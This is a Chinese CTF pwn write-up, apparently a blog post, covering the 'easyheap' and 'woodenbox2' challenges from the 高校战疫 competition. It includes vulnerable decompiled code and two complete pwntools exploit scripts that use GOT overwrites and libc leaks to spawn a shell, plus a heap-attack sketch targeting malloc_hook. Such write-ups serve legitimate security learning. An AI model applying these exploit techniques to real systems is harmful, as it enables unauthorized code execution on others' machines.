    <a href="/2020/04/03/wp-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/" class="article-date">
  <time datetime="2020-04-03T04:02:31.000Z" itemprop="datePublished">2020-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/03/wp-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/">wp 高校战疫</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="高校战疫-Pwn"><a href="#高校战疫-Pwn" class="headerlink" title="高校战疫 Pwn"></a>高校战疫 Pwn</h1><h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><h3 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h3><p>3 / 10</p>
<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>没有开启EIP,有四个功能add, delete, edit, exit.</p>
<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ptr[i]; ++i );</span><br><span class="line"><span class="keyword">if</span> ( i &gt; <span class="number">2</span> )</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Too many items!&quot;</span>);</span><br><span class="line">ptr[i] = malloc(<span class="number">0x10</span>uLL); //先开辟头部</span><br><span class="line">puts(<span class="string">&quot;How long is this message?&quot;</span>);</span><br><span class="line">nbytes = inputNum();</span><br><span class="line"><span class="keyword">if</span> ( nbytes &gt; <span class="number">1024</span> ) //添加的大小大于<span class="number">1024</span>时没有释放所管理的头部chunk</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Too much size!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这个体的漏洞点在先进行开辟内存, 然后再比较大小.可以,若输入的大小太大, 开辟内存后直接返回</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我们先计算开辟的偏移, 那么我们就可以利用用这个漏洞来实现任意地址修改.然后修改free的got表, 改为puts, 然后根据传入atoi函数的got地址, 获取atoi在libc中的地址.获取取之后,通过计算偏移获取system地址, 然后修改atoi的got表为所获得的system地址, 改完之后, 添加传入’/bin/sh’获得shell</p>
<h4 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use head chunk attack to got table</span></span><br><span class="line">p = p64(exe.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x10</span>) <span class="comment"># 在后面申请的时候大于0x400即可利用利用该地址写入</span></span><br><span class="line">p += p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">p += p64(exe.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(<span class="number">0x10</span>) <span class="comment"># 作为泄漏libc</span></span><br><span class="line">p += p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">p += p64(exe.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(<span class="number">0x10</span>) <span class="comment"># 作为修改为system 获得shell</span></span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x80</span>,  p)</span><br><span class="line">rm(<span class="number">0</span>) <span class="comment"># free</span></span><br><span class="line">ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment">#idx 0 for add head</span></span><br><span class="line">ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment">#idx 1 for attack free got</span></span><br><span class="line">ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment">#idx 2 for puts atoi addr and for call sys</span></span><br></pre></td></tr></table></figure>

<h4 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">md(<span class="number">1</span>, p64(exe.plt[<span class="string">&#x27;puts&#x27;</span>])[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"><span class="comment"># leaking atoi addr in libc</span></span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">atoi = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">lib.address = atoi - lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br></pre></td></tr></table></figure>

<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment"># for modify atoi addr</span></span><br><span class="line"><span class="comment"># modify atoi got as system addr</span></span><br><span class="line">md(<span class="number">2</span>, p64(lib.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;easyheap&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libFile = &#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	<span class="keyword">if</span>(size &lt;= <span class="number">0x400</span>):</span><br><span class="line">		sa(<span class="string">&#x27;?&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	<span class="comment"># use head chunk attack to got table</span></span><br><span class="line">	p = p64(exe.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x10</span>)</span><br><span class="line">	p += p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">	p += p64(exe.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(<span class="number">0x10</span>)</span><br><span class="line">	p += p64(<span class="number">0x0</span>) * <span class="number">2</span></span><br><span class="line">	p += p64(exe.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x80</span>,  p)</span><br><span class="line">	rm(<span class="number">0</span>) <span class="comment"># free</span></span><br><span class="line">	ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment">#idx 0 for add head</span></span><br><span class="line">	ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment">#idx 1 for attack free got</span></span><br><span class="line">	ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment">#idx 2 for puts atoi addr and for call sys</span></span><br><span class="line"></span><br><span class="line">	md(<span class="number">1</span>, p64(exe.plt[<span class="string">&#x27;puts&#x27;</span>])[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">	<span class="comment"># leaking atoi addr in libc</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	atoi = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	lib.address = atoi - lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x401</span>, <span class="string">&#x27;C&#x27;</span>) <span class="comment"># for modify atoi addr</span></span><br><span class="line">	<span class="comment"># modify atoi got as system addr</span></span><br><span class="line">	md(<span class="number">2</span>, p64(lib.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">	<span class="comment">#get shell</span></span><br><span class="line">	sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;easyheap&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span>   : io.recv()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, text</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	<span class="keyword">if</span>(size &gt; <span class="number">0x400</span>):</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">index</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">index, text</span>):</span></span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">	sa(<span class="string">&#x27;?&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	pl = p64(exe.got[<span class="string">&#x27;free&#x27;</span>]) + p64(<span class="number">0x400</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(exe.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">	ad(<span class="number">0x400</span>, pl) <span class="comment">#Add got addr to change it and get atoi addr in libc</span></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	ad(<span class="number">0x401</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#malloc to first ad item</span></span><br><span class="line">	ad(<span class="number">0x401</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x401</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	md(<span class="number">1</span>, p64(exe.plt[<span class="string">&#x27;puts&#x27;</span>])) <span class="comment">#modify free got addr as puts plt addr</span></span><br><span class="line">	rm(<span class="number">2</span>) <span class="comment">#to print the got addr atoi func and dec num</span></span><br><span class="line">	rl()</span><br><span class="line">	atoi_addr = u64(rl()[<span class="number">0</span>:<span class="number">6</span>] + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">	sys_addr = atoi_addr + lib.sym[<span class="string">&#x27;system&#x27;</span>] - lib.sym[<span class="string">&#x27;atoi&#x27;</span>] <span class="comment">#get addr in libc</span></span><br><span class="line">	li(<span class="string">&#x27;sys addr:&#x27;</span> + <span class="built_in">hex</span>(sys_addr))</span><br><span class="line">	md(<span class="number">1</span>, p64(sys_addr)) <span class="comment">#modify free got addr as system addr</span></span><br><span class="line">	ad(<span class="number">0x16</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)  <span class="comment">#set system parameter</span></span><br><span class="line">	rm(<span class="number">2</span>) <span class="comment">#exec system</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">		io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>



<h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><h3 id="难度-1"><a href="#难度-1" class="headerlink" title="难度"></a>难度</h3><p>5 / 10</p>
<h3 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h3 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( qword_2020A8[<span class="number">2</span> * v2] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>, &amp;buf);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">8u</span>LL);</span><br><span class="line">  size = atoi(&amp;nptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>, &amp;nptr);</span><br><span class="line">  v3 = read(<span class="number">0</span>, qword_2020A8[<span class="number">2</span> * v2], size); <span class="comment">// 大小没有进行检查, 堆溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)qword_2020A8[<span class="number">2</span> * v2] + v3 - <span class="number">1</span>) == <span class="number">10</span> )</span><br><span class="line">    *((_BYTE *)qword_2020A8[<span class="number">2</span> * v2] + v3 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)&amp;itemlist + <span class="number">4</span> * v2) = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)qword_2020A8[<span class="number">2</span> * v2]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>保护全开, 只有四个功能, 添加, 修改, 删除,退出. 退出时有连续释放内存, double free, 是一个典型的house of roman题. 注意的是, 在释放后, 储存指针的数组中的值会往前移动一位.</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>采用 unsorted bin attack 与 fastbin attack 结合打入IO_2_1_stderr进行泄漏出libc,然后再次利用fastbin attack打入malloc_hook进行one_gadget</p>
